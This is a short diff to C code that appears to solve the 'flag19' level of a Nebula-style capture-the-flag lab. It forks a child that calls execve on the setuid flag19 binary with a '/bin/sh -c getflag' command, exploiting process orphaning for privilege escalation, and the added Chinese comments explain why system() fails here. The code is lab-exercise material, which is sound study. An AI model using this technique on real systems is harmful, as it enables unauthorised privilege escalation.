@@ -269,6 +269,8 @@ int main() {
         char * argv[] = { "/bin/sh",  "-c", "getflag>>result" , NULL};
         char * envp[] = {"PATH=/bin:/usr/bin", NULL};
         execve("/home/flag19/flag19", argv, envp);
+        //system这个用法是完全不对的，system默认起一个shell,然后执行函数的参数，这样
+        //导致的结果就是flag19的父进程是shell，没有成功创建孤儿进程
         /*system("/home/flag19/flag19 --rcfile /tmp/reshell 2>&1 >/tmp/abcfile");*/ //system函数还是与execve函数有挺大区别的
     } else {
         printf("parent process.\n");
